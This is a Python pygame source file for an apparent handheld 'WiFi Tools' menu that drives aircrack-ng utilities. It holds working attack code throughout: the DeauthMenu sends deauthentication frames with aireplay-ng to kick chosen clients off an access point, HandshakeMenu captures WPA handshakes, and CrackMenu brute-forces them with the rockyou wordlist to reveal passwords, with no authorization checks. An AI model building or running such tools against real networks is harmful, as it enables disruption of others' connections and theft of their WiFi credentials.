import pygame
import sys
import math
import subprocess
import re
import os
import threading
import time
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
import config
from ui_elements import Button, WarningMessage, TabManager


class ScanMenu:
    def __init__(self):
        self.networks = []
        self.scanning = False
        self.selected_idx = 0
        self.info = "Press R to scan for WiFi networks."
        self.last_error = ""

    def scan_networks(self):
        self.scanning = True
        self.info = "Scanning..."
        self.last_error = ""
        try:
            # This uses wlan0; change to your interface if different!
            output = subprocess.check_output(['sudo', 'iwlist', 'wlan0', 'scan'], stderr=subprocess.STDOUT, text=True)
            self.networks = self.parse_scan(output)
            if self.networks:
                self.info = f"Found {len(self.networks)} networks."
            else:
                self.info = "No networks found."
        except subprocess.CalledProcessError as e:
            self.info = "Scan failed."
            self.last_error = str(e)
            self.networks = []
        self.scanning = False

    def parse_scan(self, scan_output):
        # Basic SSID and Signal Level extraction (extend as needed)
        cells = scan_output.split('Cell ')
        results = []
        for cell in cells[1:]:
            ssid_match = re.search(r'ESSID:"([^"]+)"', cell)
            signal_match = re.search(r'Signal level=(-?\d+)', cell)
            bssid_match = re.search(r'Address: ([\da-fA-F:]+)', cell)
            if ssid_match and bssid_match:
                ssid = ssid_match.group(1)
                signal = int(signal_match.group(1)) if signal_match else None
                bssid = bssid_match.group(1)
                results.append({
                    'ssid': ssid,
                    'signal': signal,
                    'bssid': bssid,
                })
        return results

    def handle_event(self, event):
        if event.type == pygame.KEYDOWN:
            if event.key == pygame.K_ESCAPE:
                return 'back'
            elif event.key == pygame.K_r and not self.scanning:
                self.scan_networks()
            elif event.key == pygame.K_DOWN and self.networks:
                self.selected_idx = (self.selected_idx + 1) % len(self.networks)
            elif event.key == pygame.K_UP and self.networks:
                self.selected_idx = (self.selected_idx - 1) % len(self.networks)
        return None

    def update(self):
        pass

    def draw(self, surface):
        surface.fill(config.COLORS['background'])
        font = pygame.font.SysFont(config.FONT_NAME, 40)
        surf = font.render("Scan Networks", True, config.COLORS['accent'])
        surface.blit(surf, surf.get_rect(center=(config.SCREEN_WIDTH//2, 40)))

        info_font = pygame.font.SysFont(config.FONT_NAME, 24)
        info_surf = info_font.render(self.info, True, config.COLORS['text'])
        surface.blit(info_surf, info_surf.get_rect(center=(config.SCREEN_WIDTH//2, 90)))

        # Show networks
        y = 140
        net_font = pygame.font.SysFont(config.FONT_NAME, 22)
        for i, net in enumerate(self.networks):
            s = f"{net['ssid']}  |  {net['bssid']}  |  Signal: {net['signal']} dBm" if net['signal'] else f"{net['ssid']}  |  {net['bssid']}"
            color = config.COLORS['accent'] if i == self.selected_idx else config.COLORS['text_light']
            surf = net_font.render(s, True, color)
            rect = surf.get_rect(center=(config.SCREEN_WIDTH//2, y + i*32))
            surface.blit(surf, rect)
        if self.last_error:
            err_font = pygame.font.SysFont(config.FONT_NAME, 20)
            err_surf = err_font.render(self.last_error, True, (255, 80, 80))
            surface.blit(err_surf, (10, config.SCREEN_HEIGHT-30))

        # Instructions
        hint_font = pygame.font.SysFont(config.FONT_NAME, 18)
        hints = "UP/DOWN = select  |  R = rescan  |  ESC = back"
        hint_surf = hint_font.render(hints, True, config.COLORS['text_light'])
        surface.blit(hint_surf, (10, config.SCREEN_HEIGHT-30))

class HandshakeMenu:
    def __init__(self):
        self.info = "Select network and press ENTER to capture handshake."
        self.capturing = False
        self.capture_thread = None
        self.selected_idx = 0
        self.networks = []
        self.capture_status = ""
        self.capture_file = "/tmp/handshake.cap"
        self.interface = "wlan0mon"  # Change if needed
        self.scan_thread = threading.Thread(target=self.scan_networks)
        self.scan_thread.start()
        self.last_scan_time = 0

    def scan_networks(self):
        self.networks = []
        try:
            # Use airodump-ng in short burst for AP listing (not handshake capture yet)
            proc = subprocess.Popen(
                ["airodump-ng", self.interface, "--output-format", "csv", "-w", "/tmp/handshake_scan"],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            time.sleep(6)  # Wait 6 seconds for some scan data
            proc.terminate()
            time.sleep(1)
            # Parse CSV
            path = "/tmp/handshake_scan-01.csv"
            if os.path.exists(path):
                with open(path, "r") as f:
                    lines = f.readlines()
                aps = []
                found_header = False
                for line in lines:
                    if line.startswith("BSSID"):
                        found_header = True
                        continue
                    if found_header:
                        # End of AP list: blank line, then stations start
                        if not line.strip():
                            break
                        cols = line.strip().split(',')
                        if len(cols) > 13:
                            bssid = cols[0].strip()
                            channel = cols[3].strip()
                            ssid = cols[13].strip()
                            enc = cols[5].strip()
                            aps.append({'bssid': bssid, 'channel': channel, 'ssid': ssid, 'enc': enc})
                self.networks = aps
        except Exception as e:
            self.info = f"Scan error: {e}"

    def start_capture(self, target):
        self.capturing = True
        self.capture_status = "Starting handshake capture..."
        # Use threading to avoid blocking UI
        self.capture_thread = threading.Thread(target=self._capture_handshake, args=(target,))
        self.capture_thread.start()

    def _capture_handshake(self, target):
        try:
            # Remove previous capture
            try: os.remove(self.capture_file)
            except: pass
            # 1. Run airodump-ng focused on the target
            cmd = [
                "airodump-ng",
                "-c", target['channel'],
                "--bssid", target['bssid'],
                "-w", "/tmp/handshake",
                self.interface
            ]
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.capture_status = "Capturing... Press ESC to stop."
            handshake_found = False
            cap_path = "/tmp/handshake-01.cap"
            t0 = time.time()
            # Monitor file size and airodump-ng output for handshake
            while not handshake_found and time.time() - t0 < 60:
                time.sleep(3)
                if os.path.exists(cap_path) and os.path.getsize(cap_path) > 0:
                    # Run aircrack-ng to check for handshake
                    out = subprocess.check_output([
                        "aircrack-ng", "-a2", "-w", "/dev/null", cap_path
                    ], stderr=subprocess.STDOUT, text=True)
                    if "1 handshake" in out or "handshake" in out:
                        handshake_found = True
                        self.capture_status = f"Handshake captured for {target['ssid']}!"
                        break
            proc.terminate()
            # Move file to save as handshake
            if handshake_found:
                os.rename(cap_path, self.capture_file)
            else:
                self.capture_status = "Handshake NOT captured. Try again."
        except Exception as e:
            self.capture_status = f"Error: {e}"
        self.capturing = False

    def handle_event(self, event):
        if self.capturing:
            if event.type == pygame.KEYDOWN and event.key == pygame.K_ESCAPE:
                # Stop capture process (not graceful, demo only)
                self.capture_status = "Stopping capture..."
                self.capturing = False
                return 'back'
            return

        if event.type == pygame.KEYDOWN:
            if event.key == pygame.K_ESCAPE:
                return 'back'
            elif event.key == pygame.K_DOWN and self.networks:
                self.selected_idx = (self.selected_idx + 1) % len(self.networks)
            elif event.key == pygame.K_UP and self.networks:
                self.selected_idx = (self.selected_idx - 1) % len(self.networks)
            elif event.key in (pygame.K_RETURN, pygame.K_KP_ENTER) and self.networks:
                self.start_capture(self.networks[self.selected_idx])
        return None

    def update(self):
        # Rescan networks every 30s if not capturing
        if not self.capturing and time.time() - self.last_scan_time > 30:
            self.scan_thread = threading.Thread(target=self.scan_networks)
            self.scan_thread.start()
            self.last_scan_time = time.time()

    def draw(self, surface):
        surface.fill(config.COLORS['background'])
        font = pygame.font.SysFont(config.FONT_NAME, 40)
        surf = font.render("Capture Handshake", True, config.COLORS['accent'])
        surface.blit(surf, surf.get_rect(center=(config.SCREEN_WIDTH//2, 40)))
        info_font = pygame.font.SysFont(config.FONT_NAME, 24)
        info_surf = info_font.render(self.info, True, config.COLORS['text'])
        surface.blit(info_surf, info_surf.get_rect(center=(config.SCREEN_WIDTH//2, 80)))

        # List networks
        y = 120
        net_font = pygame.font.SysFont(config.FONT_NAME, 22)
        for i, net in enumerate(self.networks):
            s = f"{net['ssid']} | CH {net['channel']} | {net['bssid']}"
            color = config.COLORS['accent'] if i == self.selected_idx else config.COLORS['text_light']
            surf = net_font.render(s, True, color)
            rect = surf.get_rect(center=(config.SCREEN_WIDTH//2, y + i*32))
            surface.blit(surf, rect)

        # Show status
        if self.capturing or self.capture_status:
            stat_font = pygame.font.SysFont(config.FONT_NAME, 22)
            stat_surf = stat_font.render(self.capture_status, True, config.COLORS['text'])
            surface.blit(stat_surf, (40, config.SCREEN_HEIGHT-60))

        # Instructions
        hint_font = pygame.font.SysFont(config.FONT_NAME, 18)
        hints = "UP/DOWN = select  |  ENTER = capture  |  ESC = back/stop"
        hint_surf = hint_font.render(hints, True, config.COLORS['text_light'])
        surface.blit(hint_surf, (10, config.SCREEN_HEIGHT-30))


class DeauthMenu:
    def __init__(self):
        self.stage = 0  # 0: select AP, 1: select client, 2: attacking
        self.info = "Scanning for networks..."
        self.ap_list = []
        self.client_list = []
        self.selected_ap = 0
        self.selected_client = 0
        self.attack_thread = None
        self.attacking = False
        self.attack_status = ""
        self.interface = "wlan0mon"  # Change if needed

        self._start_scan()

    def _start_scan(self):
        # Scan APs and associated clients with airodump-ng
        threading.Thread(target=self._scan_aps).start()

    def _scan_aps(self):
        self.info = "Scanning for APs and clients..."
        # Clean up previous files
        try:
            os.remove("/tmp/deauth_scan-01.csv")
        except Exception:
            pass
        proc = subprocess.Popen(
            ["airodump-ng", self.interface, "--output-format", "csv", "-w", "/tmp/deauth_scan"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        time.sleep(7)
        proc.terminate()
        time.sleep(1)
        ap_list, client_list = self._parse_csv("/tmp/deauth_scan-01.csv")
        self.ap_list = ap_list
        self.client_list = client_list
        if ap_list:
            self.info = "Select an AP and press ENTER."
            self.stage = 0
        else:
            self.info = "No APs found. Press R to rescan."
            self.stage = 0

    def _parse_csv(self, path):
        ap_list = []
        client_list = []
        if not os.path.exists(path):
            return ap_list, client_list
        with open(path, "r") as f:
            lines = f.readlines()
        # Parse APs
        ap_section = True
        for line in lines:
            if line.startswith("BSSID"):
                continue
            if not line.strip():
                ap_section = False
                continue
            if ap_section:
                cols = line.strip().split(",")
                if len(cols) > 13:
                    bssid = cols[0].strip()
                    ch = cols[3].strip()
                    ssid = cols[13].strip()
                    ap_list.append({'bssid': bssid, 'channel': ch, 'ssid': ssid})
            else:
                cols = line.strip().split(",")
                if len(cols) > 6:
                    client_mac = cols[0].strip()
                    ap_bssid = cols[5].strip()
                    if ap_bssid and client_mac != ap_bssid:
                        client_list.append({'client': client_mac, 'ap_bssid': ap_bssid})
        return ap_list, client_list

    def _start_attack(self, ap, client):
        self.attacking = True
        self.attack_status = f"Deauthenticating {client['client']} from {ap['ssid']}..."
        self.attack_thread = threading.Thread(target=self._attack, args=(ap, client))
        self.attack_thread.start()

    def _attack(self, ap, client):
        try:
            cmd = [
                "aireplay-ng", "--deauth", "20",
                "-a", ap['bssid'],
                "-c", client['client'],
                self.interface
            ]
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(8)  # Send packets for a while
            proc.terminate()
            self.attack_status = "Attack finished. Press ESC to go back."
        except Exception as e:
            self.attack_status = f"Attack failed: {e}"
        self.attacking = False

    def handle_event(self, event):
        if self.attacking:
            if event.type == pygame.KEYDOWN and event.key == pygame.K_ESCAPE:
                self.attack_status = "Attack stopped. Press ESC again to return."
                self.attacking = False
                return 'back'
            return

        if self.stage == 0:
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_ESCAPE:
                    return 'back'
                elif event.key == pygame.K_DOWN and self.ap_list:
                    self.selected_ap = (self.selected_ap + 1) % len(self.ap_list)
                elif event.key == pygame.K_UP and self.ap_list:
                    self.selected_ap = (self.selected_ap - 1) % len(self.ap_list)
                elif event.key in (pygame.K_RETURN, pygame.K_KP_ENTER) and self.ap_list:
                    # Move to client selection for this AP
                    ap_bssid = self.ap_list[self.selected_ap]['bssid']
                    filtered_clients = [c for c in self.client_list if c['ap_bssid'] == ap_bssid]
                    if filtered_clients:
                        self.client_list_for_ap = filtered_clients
                        self.selected_client = 0
                        self.stage = 1
                        self.info = "Select a client and press ENTER."
                    else:
                        self.info = "No clients found for this AP."
                elif event.key == pygame.K_r:
                    self._start_scan()

        elif self.stage == 1:
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_ESCAPE:
                    self.stage = 0
                    self.info = "Select an AP and press ENTER."
                elif event.key == pygame.K_DOWN and self.client_list_for_ap:
                    self.selected_client = (self.selected_client + 1) % len(self.client_list_for_ap)
                elif event.key == pygame.K_UP and self.client_list_for_ap:
                    self.selected_client = (self.selected_client - 1) % len(self.client_list_for_ap)
                elif event.key in (pygame.K_RETURN, pygame.K_KP_ENTER) and self.client_list_for_ap:
                    ap = self.ap_list[self.selected_ap]
                    client = self.client_list_for_ap[self.selected_client]
                    self._start_attack(ap, client)
                    self.stage = 2

        elif self.stage == 2:
            if event.type == pygame.KEYDOWN and event.key == pygame.K_ESCAPE:
                return 'back'

        return None

    def update(self):
        pass

    def draw(self, surface):
        surface.fill(config.COLORS['background'])
        font = pygame.font.SysFont(config.FONT_NAME, 38)
        surf = font.render("Deauth Attack", True, config.COLORS['accent'])
        surface.blit(surf, surf.get_rect(center=(config.SCREEN_WIDTH//2, 40)))

        info_font = pygame.font.SysFont(config.FONT_NAME, 24)
        info_surf = info_font.render(self.info, True, config.COLORS['text'])
        surface.blit(info_surf, (40, 85))

        y = 130
        net_font = pygame.font.SysFont(config.FONT_NAME, 22)

        if self.stage == 0:  # AP selection
            for i, ap in enumerate(self.ap_list):
                s = f"{ap['ssid']} | {ap['bssid']}"
                color = config.COLORS['accent'] if i == self.selected_ap else config.COLORS['text_light']
                surf = net_font.render(s, True, color)
                rect = surf.get_rect(center=(config.SCREEN_WIDTH//2, y + i*30))
                surface.blit(surf, rect)
        elif self.stage == 1:  # Client selection
            for i, client in enumerate(self.client_list_for_ap):
                s = f"Client: {client['client']}"
                color = config.COLORS['accent'] if i == self.selected_client else config.COLORS['text_light']
                surf = net_font.render(s, True, color)
                rect = surf.get_rect(center=(config.SCREEN_WIDTH//2, y + i*30))
                surface.blit(surf, rect)
        elif self.stage == 2:  # Attacking
            stat_font = pygame.font.SysFont(config.FONT_NAME, 24)
            stat_surf = stat_font.render(self.attack_status, True, config.COLORS['text'])
            surface.blit(stat_surf, (40, y))

        # Hints
        hint_font = pygame.font.SysFont(config.FONT_NAME, 18)
        if self.stage == 0:
            hints = "UP/DOWN: select AP | ENTER: select | R: rescan | ESC: back"
        elif self.stage == 1:
            hints = "UP/DOWN: select client | ENTER: deauth | ESC: back"
        else:
            hints = "ESC: stop/return"
        hint_surf = hint_font.render(hints, True, config.COLORS['text_light'])
        surface.blit(hint_surf, (10, config.SCREEN_HEIGHT-30))

class CrackMenu:
    def __init__(self):
        self.info = "Select handshake file and press ENTER to crack."
        self.handshakes_dir = "/tmp"  # Where your cap files are saved
        self.wordlist = "/usr/share/wordlists/rockyou.txt"  # Change if needed
        self.cap_files = self._find_cap_files()
        self.selected_idx = 0
        self.cracking = False
        self.crack_status = ""
        self.crack_thread = None
        self.result = None

    def _find_cap_files(self):
        # Find .cap files in the directory
        files = []
        for fname in os.listdir(self.handshakes_dir):
            if fname.endswith('.cap'):
                files.append(fname)
        return files

    def start_crack(self, cap_file):
        self.cracking = True
        self.crack_status = f"Cracking {cap_file}..."
        self.result = None
        self.crack_thread = threading.Thread(target=self._crack, args=(cap_file,))
        self.crack_thread.start()

    def _crack(self, cap_file):
        try:
            cmd = [
                "aircrack-ng", "-w", self.wordlist,
                os.path.join(self.handshakes_dir, cap_file)
            ]
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            out_lines = []
            while True:
                line = proc.stdout.readline()
                if not line:
                    break
                out_lines.append(line)
                if "KEY FOUND!" in line or "Passphrase not in dictionary" in line:
                    break
                self.crack_status = line.strip()
            proc.wait()
            # Find result
            for line in out_lines:
                if "KEY FOUND!" in line:
                    pw = line.split(":")[-1].strip()
                    self.result = f"Password: {pw}"
                    break
            if not self.result:
                self.result = "No password found."
        except Exception as e:
            self.result = f"Error: {e}"
        self.cracking = False

    def handle_event(self, event):
        if self.cracking:
            return
        if event.type == pygame.KEYDOWN:
            if event.key == pygame.K_ESCAPE:
                return 'back'
            elif event.key == pygame.K_DOWN and self.cap_files:
                self.selected_idx = (self.selected_idx + 1) % len(self.cap_files)
            elif event.key == pygame.K_UP and self.cap_files:
                self.selected_idx = (self.selected_idx - 1) % len(self.cap_files)
            elif event.key in (pygame.K_RETURN, pygame.K_KP_ENTER) and self.cap_files:
                cap_file = self.cap_files[self.selected_idx]
                self.start_crack(cap_file)
        return None

    def update(self):
        # Reload .cap file list if not cracking
        if not self.cracking:
            self.cap_files = self._find_cap_files()

    def draw(self, surface):
        surface.fill(config.COLORS['background'])
        font = pygame.font.SysFont(config.FONT_NAME, 40)
        surf = font.render("Crack Handshake", True, config.COLORS['accent'])
        surface.blit(surf, surf.get_rect(center=(config.SCREEN_WIDTH//2, 40)))
        info_font = pygame.font.SysFont(config.FONT_NAME, 24)
        info_surf = info_font.render(self.info, True, config.COLORS['text'])
        surface.blit(info_surf, (40, 85))

        y = 130
        file_font = pygame.font.SysFont(config.FONT_NAME, 22)
        for i, fname in enumerate(self.cap_files):
            color = config.COLORS['accent'] if i == self.selected_idx else config.COLORS['text_light']
            surf = file_font.render(fname, True, color)
            rect = surf.get_rect(center=(config.SCREEN_WIDTH//2, y + i*30))
            surface.blit(surf, rect)

        # Show cracking status
        stat_y = config.SCREEN_HEIGHT-90
        if self.cracking or self.crack_status:
            stat_font = pygame.font.SysFont(config.FONT_NAME, 22)
            stat_surf = stat_font.render(self.crack_status, True, config.COLORS['text'])
            surface.blit(stat_surf, (40, stat_y))

        # Show result
        if self.result:
            result_font = pygame.font.SysFont(config.FONT_NAME, 26)
            result_surf = result_font.render(self.result, True, config.COLORS['accent'])
            surface.blit(result_surf, (40, stat_y + 30))

        # Instructions
        hint_font = pygame.font.SysFont(config.FONT_NAME, 18)
        hints = "UP/DOWN = select  |  ENTER = crack  |  ESC = back"
        hint_surf = hint_font.render(hints, True, config.COLORS['text_light'])
        surface.blit(hint_surf, (10, config.SCREEN_HEIGHT-30))

class MonitorMenu:
    def __init__(self):
        self.info = "Enable/disable monitor mode. Select interface, ENTER to toggle."
        self.ifaces = self.list_wifi_ifaces()
        self.selected = 0
        self.status = ""
        self.last_error = ""
        self.busy = False
        self.update_status()

    def list_wifi_ifaces(self):
        # Use 'iw dev' to find all wifi interfaces
        try:
            out = subprocess.check_output(["iw", "dev"], text=True)
            ifaces = []
            for line in out.splitlines():
                if "Interface" in line:
                    iface = line.split()[-1]
                    ifaces.append(iface)
            return ifaces
        except Exception as e:
            self.last_error = f"Error listing interfaces: {e}"
            return []

    def iface_mode(self, iface):
        try:
            out = subprocess.check_output(["iw", "dev", iface, "info"], text=True)
            if "type monitor" in out:
                return "monitor"
            elif "type managed" in out:
                return "managed"
            else:
                return "unknown"
        except Exception:
            return "unknown"

    def update_status(self):
        if not self.ifaces:
            self.status = "No WiFi interfaces found!"
            return
        status = []
        for i, iface in enumerate(self.ifaces):
            mode = self.iface_mode(iface)
            prefix = ">" if i == self.selected else " "
            status.append(f"{prefix} {iface}: {mode}")
        self.status = "  ".join(status)

    def set_mode(self, iface, to_monitor):
        if self.busy:
            return
        self.busy = True
        t = threading.Thread(target=self._set_mode, args=(iface, to_monitor))
        t.start()

    def _set_mode(self, iface, to_monitor):
        try:
            # Always kill conflicting processes first
            if to_monitor:
                subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            # Try airmon-ng first (will work for most USB adapters)
            cmd = ["sudo", "airmon-ng", "start" if to_monitor else "stop", iface]
            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            # airmon-ng might change interface name; rescan interfaces
            self.ifaces = self.list_wifi_ifaces()
            # For built-in Pi WiFi, try manual mode switch if needed
            mode = self.iface_mode(iface)
            if to_monitor and mode != "monitor":
                subprocess.run(["sudo", "ip", "link", "set", iface, "down"])
                subprocess.run(["sudo", "iw", iface, "set", "monitor", "control"])
                subprocess.run(["sudo", "ip", "link", "set", iface, "up"])
            elif not to_monitor and mode == "monitor":
                subprocess.run(["sudo", "ip", "link", "set", iface, "down"])
                subprocess.run(["sudo", "iw", iface, "set", "type", "managed"])
                subprocess.run(["sudo", "ip", "link", "set", iface, "up"])
            self.last_error = ""
        except Exception as e:
            self.last_error = f"Error: {e}"
        self.busy = False
        self.update_status()

    def handle_event(self, event):
        if self.busy:
            return
        if event.type == pygame.KEYDOWN:
            if event.key == pygame.K_ESCAPE:
                return 'back'
            elif event.key == pygame.K_DOWN and self.ifaces:
                self.selected = (self.selected + 1) % len(self.ifaces)
                self.update_status()
            elif event.key == pygame.K_UP and self.ifaces:
                self.selected = (self.selected - 1) % len(self.ifaces)
                self.update_status()
            elif event.key == pygame.K_RETURN and self.ifaces:
                iface = self.ifaces[self.selected]
                mode = self.iface_mode(iface)
                self.set_mode(iface, to_monitor=(mode != "monitor"))
        return None

    def update(self):
        self.update_status()

    def draw(self, surface):
        surface.fill(config.COLORS['background'])
        font = pygame.font.SysFont(config.FONT_NAME, 40)
        surf = font.render("Monitor Mode", True, config.COLORS['accent'])
        surface.blit(surf, surf.get_rect(center=(config.SCREEN_WIDTH//2, 40)))

        info_font = pygame.font.SysFont(config.FONT_NAME, 24)
        info_surf = info_font.render(self.info, True, config.COLORS['text'])
        surface.blit(info_surf, (40, 85))

        # Show all interfaces and their modes
        status_font = pygame.font.SysFont(config.FONT_NAME, 26)
        y = 135
        for i, iface in enumerate(self.ifaces):
            mode = self.iface_mode(iface)
            prefix = ">" if i == self.selected else " "
            color = config.COLORS['accent'] if i == self.selected else config.COLORS['text_light']
            surf = status_font.render(f"{prefix} {iface}: {mode}", True, color)
            surface.blit(surf, (40, y + i*32))

        # Error
        if self.last_error:
            err_font = pygame.font.SysFont(config.FONT_NAME, 22)
            err_surf = err_font.render(self.last_error, True, (255, 60, 60))
            surface.blit(err_surf, (40, y + len(self.ifaces)*32 + 10))

        # Action hint
        hint_font = pygame.font.SysFont(config.FONT_NAME, 20)
        if self.busy:
            hint = "Working, please wait..."
        else:
            hint = "UP/DOWN = select  |  ENTER = toggle mode  |  ESC = back"
        hint_surf = hint_font.render(hint, True, config.COLORS['text_light'])
        surface.blit(hint_surf, (10, config.SCREEN_HEIGHT-30))


class SavedMenu:
    def __init__(self):
        self.info = "View and manage saved captures here."
        self.save_dir = "/tmp"  # Change to your data directory if needed
        self.files = self._scan_files()
        self.selected_idx = 0
        self.delete_confirm = False
        self.last_action = ""

    def _scan_files(self):
        # List .cap and .csv files
        result = []
        for fname in os.listdir(self.save_dir):
            if fname.endswith(".cap") or fname.endswith(".csv"):
                path = os.path.join(self.save_dir, fname)
                stat = os.stat(path)
                result.append({
                    "fname": fname,
                    "size": stat.st_size,
                    "ctime": stat.st_ctime
                })
        result.sort(key=lambda x: x["ctime"], reverse=True)
        return result

    def delete_file(self, idx):
        try:
            os.remove(os.path.join(self.save_dir, self.files[idx]["fname"]))
            self.last_action = f"Deleted {self.files[idx]['fname']}"
            self.files = self._scan_files()
            self.selected_idx = max(0, self.selected_idx - 1)
        except Exception as e:
            self.last_action = f"Delete failed: {e}"

    def handle_event(self, event):
        if self.delete_confirm:
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_y:
                    self.delete_file(self.selected_idx)
                    self.delete_confirm = False
                elif event.key in (pygame.K_n, pygame.K_ESCAPE):
                    self.delete_confirm = False
            return

        if event.type == pygame.KEYDOWN:
            if event.key == pygame.K_ESCAPE:
                return 'back'
            elif event.key == pygame.K_DOWN and self.files:
                self.selected_idx = (self.selected_idx + 1) % len(self.files)
            elif event.key == pygame.K_UP and self.files:
                self.selected_idx = (self.selected_idx - 1) % len(self.files)
            elif event.key == pygame.K_d and self.files:
                self.delete_confirm = True
        return None

    def update(self):
        self.files = self._scan_files()

    def draw(self, surface):
        surface.fill(config.COLORS['background'])
        font = pygame.font.SysFont(config.FONT_NAME, 40)
        surf = font.render("Saved Captures", True, config.COLORS['accent'])
        surface.blit(surf, surf.get_rect(center=(config.SCREEN_WIDTH//2, 40)))

        info_font = pygame.font.SysFont(config.FONT_NAME, 24)
        info_surf = info_font.render(self.info, True, config.COLORS['text'])
        surface.blit(info_surf, (40, 85))

        y = 130
        file_font = pygame.font.SysFont(config.FONT_NAME, 22)
        for i, f in enumerate(self.files):
            t = time.strftime("%Y-%m-%d %H:%M", time.localtime(f["ctime"]))
            size = f["size"] // 1024
            s = f"{f['fname']} ({size} KB, {t})"
            color = config.COLORS['accent'] if i == self.selected_idx else config.COLORS['text_light']
            surf = file_font.render(s, True, color)
            rect = surf.get_rect(center=(config.SCREEN_WIDTH//2, y + i*30))
            surface.blit(surf, rect)

        # Show file details
        if self.files:
            sel = self.files[self.selected_idx]
            detail_font = pygame.font.SysFont(config.FONT_NAME, 20)
            path = os.path.join(self.save_dir, sel["fname"])
            details = f"File: {sel['fname']} | Size: {sel['size'] // 1024} KB | Path: {path}"
            detail_surf = detail_font.render(details, True, config.COLORS['text'])
            surface.blit(detail_surf, (40, config.SCREEN_HEIGHT-100))

        # Delete confirmation
        if self.delete_confirm and self.files:
            msg_font = pygame.font.SysFont(config.FONT_NAME, 26)
            msg = f"Delete {self.files[self.selected_idx]['fname']}? (Y/N)"
            msg_surf = msg_font.render(msg, True, (255,60,60))
            r = msg_surf.get_rect(center=(config.SCREEN_WIDTH//2, config.SCREEN_HEIGHT//2))
            pygame.draw.rect(surface, (50,0,0), r.inflate(16,16))
            surface.blit(msg_surf, r)

        # Last action/status
        if self.last_action:
            la_font = pygame.font.SysFont(config.FONT_NAME, 18)
            la_surf = la_font.render(self.last_action, True, config.COLORS['accent'])
            surface.blit(la_surf, (40, config.SCREEN_HEIGHT-70))

        # Instructions
        hint_font = pygame.font.SysFont(config.FONT_NAME, 18)
        hints = "UP/DOWN = select | D = delete | ESC = back"
        hint_surf = hint_font.render(hints, True, config.COLORS['text_light'])
        surface.blit(hint_surf, (10, config.SCREEN_HEIGHT-30))


# --- Main Menu ---

class WifiMenu:
    ITEMS_PER_TAB = 3

    def __init__(self):
        self.selected_idx = 0
        self.active_page = None  # Track which submenu is currently active

        self.types_wifi = [
            "Scan Networks",
            "Capture Handshake",
            "Deauth Attack",
            "Crack Handshake",
            "Monitor Mode",
            "Saved Captures"
        ]
        self.btns = [
            Button(t, (0, 0, 400, 60), lambda idx=i: self.open_page(idx))
            for i, t in enumerate(self.types_wifi)
        ]
        tabs = math.ceil(len(self.types_wifi) / self.ITEMS_PER_TAB)
        self.tabmgr = TabManager(["" for _ in range(tabs)])

        self.warning = WarningMessage("")

        # Instantiate submenus, map index to class
        self.pages = [
            ScanMenu(),
            HandshakeMenu(),
            DeauthMenu(),
            CrackMenu(),
            MonitorMenu(),
            SavedMenu()
        ]

    def open_page(self, idx):
        self.active_page = self.pages[idx]

    def handle_event(self, event):
        if self.active_page:
            result = self.active_page.handle_event(event)
            if result == 'back':
                self.active_page = None
            return

        if event.type == pygame.QUIT:
            pygame.quit()
            sys.exit()

        self.tabmgr.handle_event(event)

        if event.type == pygame.KEYDOWN:
            if event.key in (pygame.K_DOWN, pygame.K_UP):
                step = 1 if event.key == pygame.K_DOWN else -1
                self.selected_idx = (self.selected_idx + step) % len(self.btns)
                self.tabmgr.active = self.selected_idx // self.ITEMS_PER_TAB
                return
            if event.key in (pygame.K_RETURN, pygame.K_KP_ENTER):
                self.btns[self.selected_idx].callback()
                return
            elif event.key == pygame.K_ESCAPE:
                pygame.quit()

        for i, btn in enumerate(self.btns):
            btn.handle_event(event)
            if btn.hovered:
                self.selected_idx = i
                self.tabmgr.active = i // self.ITEMS_PER_TAB

    def update(self):
        if self.active_page:
            self.active_page.update()
        self.warning.update()

    def draw(self, surface):
        if self.active_page:
            self.active_page.draw(surface)
            # Optional: Draw a back indicator/hint
            font = pygame.font.SysFont(config.FONT_NAME, 18)
            hint = font.render("ESC = Back", True, config.COLORS['text_light'])
            surface.blit(hint, (10, config.SCREEN_HEIGHT - 30))
            return

        surface.fill(config.COLORS['background'])
        font = pygame.font.SysFont(config.FONT_NAME, 40)
        title_surf = font.render("WiFi Tools", True, config.COLORS['text'])
        surface.blit(title_surf, title_surf.get_rect(center=(config.SCREEN_WIDTH//2, 35)))

        active_tab = self.tabmgr.active
        start = active_tab * self.ITEMS_PER_TAB
        end = start + self.ITEMS_PER_TAB
        for idx, btn in enumerate(self.btns[start:end]):
            global_idx = start + idx
            btn.rect.x = config.SCREEN_WIDTH//2 - btn.rect.width//2
            btn.rect.y = 70 + idx * (btn.rect.height + 10)
            pygame.draw.rect(
                surface,
                config.COLORS['button'],
                btn.rect,
                border_radius=config.RADIUS['app_button']
            )
            lbl_font = pygame.font.SysFont(config.FONT_NAME, 30)
            lbl_surf = lbl_font.render(btn.text, True, config.COLORS['text_light'])
            surface.blit(lbl_surf, lbl_surf.get_rect(center=btn.rect.center))
            if global_idx == self.selected_idx:
                pygame.draw.rect(
                    surface,
                    config.COLORS['accent'],
                    btn.rect.inflate(6, 6),
                    width=4,
                    border_radius=config.RADIUS['app_button'] + 4
                )

        self.tabmgr.draw(surface)
        self.warning.draw(surface)

def main():
    pygame.init()
    screen = pygame.display.set_mode((config.SCREEN_WIDTH, config.SCREEN_HEIGHT), pygame.FULLSCREEN)
    pygame.display.set_caption("WiFi Tools Menu")
    clock = pygame.time.Clock()

    menu = WifiMenu()
    while True:
        for event in pygame.event.get():
            menu.handle_event(event)
        menu.update()
        menu.draw(screen)
        pygame.display.flip()
        clock.tick(config.FPS)

if __name__ == '__main__':
    main()
